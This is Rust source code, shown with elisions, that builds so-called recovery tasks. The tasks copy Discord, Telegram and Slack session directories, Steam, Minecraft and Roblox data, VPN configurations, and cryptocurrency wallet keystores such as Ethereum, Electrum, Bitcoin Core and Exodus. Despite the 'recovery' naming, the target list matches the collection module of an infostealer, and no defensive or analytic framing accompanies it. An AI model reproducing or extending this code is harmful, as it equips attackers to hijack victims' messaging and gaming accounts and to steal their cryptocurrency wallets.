...
fn build_discord_paths(ctx: &RecoveryContext) -> Vec<PathBuf> {
    let mut result = Vec::new();
    let app_roaming = &ctx.roaming_data_dir;
    static VARIANTS: [&str; 7] = [
        "discord",
        "discordcanary",
        "Lightcord",
        "discordptb",
    ...
    for variant in VARIANTS {
        result.push(app_roaming.join(variant));
    }
    result
}

fn build_telegram_paths(ctx: &RecoveryContext) -> Vec<PathBuf> {
    let mut result = Vec::new();
    result.push(ctx.local_data_dir.join("Telegram Desktop").join("tdata"));
    result.push(ctx.roaming_data_dir.join("Telegram Desktop").join("tdata"));
    result.push(
...
fn build_slack_paths(ctx: &RecoveryContext) -> Vec<PathBuf> {
    vec![
        ctx.roaming_data_dir
            .join("Slack")
            .join("Local Storage")
...
pub fn messenger_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    ...
    let discord_task: Arc<dyn RecoveryTask> = Arc::new(
        DirectorySnapshotTask::new(
            "Discord Sessions",
            RecoveryCategory::Messengers,
            build_discord_paths(ctx),
        )
        .with_limits(6, 2048),
    );
    tasks.push(discord_task);

    let telegram_task: Arc<dyn RecoveryTask> = Arc::new(
        DirectorySnapshotTask::new(
            "Telegram TData",
            RecoveryCategory::Messengers,
            build_telegram_paths(ctx),
        )
        .with_limits(5, 1024),
    );
    tasks.push(telegram_task);

    let slack_task: Arc<dyn RecoveryTask> = Arc::new(
        DirectorySnapshotTask::new(
            "Slack Local Storage",
            RecoveryCategory::Messengers,
            build_slack_paths(ctx),
        )
        .with_limits(4, 512),
    );
    tasks.push(slack_task);

    tasks
}

pub fn gaming_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    ...
    let steam_task: Arc<dyn RecoveryTask> = Arc::new(
        DirectorySnapshotTask::new(
            "Steam Config",
            RecoveryCategory::Gaming,
            vec![
                local.join("Steam").join("config"),
                local.join("Steam").join("logs"),
            ],
        )
        .with_limits(4, 800),
    );
    tasks.push(steam_task);

    let minecraft_task: Arc<dyn RecoveryTask> = Arc::new(
        DirectorySnapshotTask::new(
            "Minecraft Runtimes",
            RecoveryCategory::Gaming,
            vec![
                roaming.join(".minecraft"),
                home.join("intentlauncher"),
                roaming.join("PrismLauncher"),
                roaming.join("MultiMC"),
                roaming.join("curseforge"),
            ],
        )
        .with_limits(6, 1500),
    );
    tasks.push(minecraft_task);

    let roblox_task: Arc<dyn RecoveryTask> = Arc::new(
        DirectorySnapshotTask::new(
            "Roblox Data",
            RecoveryCategory::Gaming,
            vec![local.join("Roblox"), roaming.join("Roblox")],
        )
        .with_limits(5, 1000),
    );
    tasks.push(roblox_task);
...
fn vpn_specs(ctx: &RecoveryContext) -> Vec<(&'static str, Vec<PathBuf>, usize, usize)> {
    vec![
        (
            "NordVPN Config",
            vec![ctx.local_data_dir.join("NordVPN")],
            4,
            256,
        ),
        (
            "OpenVPN Config",
            vec![
                ctx.local_data_dir.join("OpenVPN").join("config"),
                ctx.home_dir.join("OpenVPN").join("config"),
            ],
            4,
            512,
        ),
        (
            "ProtonVPN Sessions",
            vec![ctx.local_data_dir.join("ProtonVPN")],
            4,
            512,
        ),
        (
            "Surfshark Settings",
            vec![
                ctx.roaming_data_dir.join("Surfshark"),
                ctx.local_data_dir.join("Surfshark"),
            ],
            3,
            256,
        ),
...
pub fn vpn_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vpn_specs(ctx)
        .into_iter()
        .map(|(label, sources, depth, limit)| {
            snapshot_task(label, RecoveryCategory::VPNs, sources, depth, limit)
        })
        .collect()
}

pub(crate) fn wallet_specs(
    ctx: &RecoveryContext,
) -> Vec<(&'static str, Vec<PathBuf>, usize, usize)> {
    vec![
        (
            "Ethereum Keystore",
            vec![ctx.roaming_data_dir.join("Ethereum").join("keystore")],
            4,
            512,
        ),
        (
            "Electrum Wallets",
            vec![ctx.roaming_data_dir.join("Electrum").join("wallets")],
            4,
            512,
        ),
        (
            "Dash Data",
            vec![
                ctx.roaming_data_dir.join("Dash"),
                ctx.local_data_dir.join("Dash"),
            ],
            3,
            256,
        ),
        (
            "Bytecoin Files",
            vec![ctx.roaming_data_dir.join("bytecoin")],
            3,
            256,
        ),
        (
            "Bitcoin Core",
            vec![ctx.roaming_data_dir.join("Bitcoin Core")],
            4,
            512,
        ),
        (
        ...
        (
            "Armory Files",
            vec![ctx.roaming_data_dir.join("Armory")],
            4,
            512,
        ),
        (
            "Exodus Container",
            vec![ctx.roaming_data_dir.join("Exodus")],
            3,
            512,
        ),
        (
        ...
        (
            "Litecoin Profiles",
            vec![ctx.roaming_data_dir.join("Litecoin Core")],
            4,
            512,
        ),
        (
        ...
        (
            "Zcash Storage",
            vec![ctx.roaming_data_dir.join("Zcash")],
            3,
            256,
        ),
        (
        ...
        (
            "Zephyr Wallets",
            vec![ctx.roaming_data_dir.join("Zephyr").join("wallets")],
            3,
            256,
        ),
    ]
...
pub fn wallet_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    wallet_specs(ctx)
        .into_iter()
        .map(|(label, sources, depth, limit)| {
            snapshot_task(label, RecoveryCategory::Wallets, sources, depth, limit)
        })
        .collect()
}
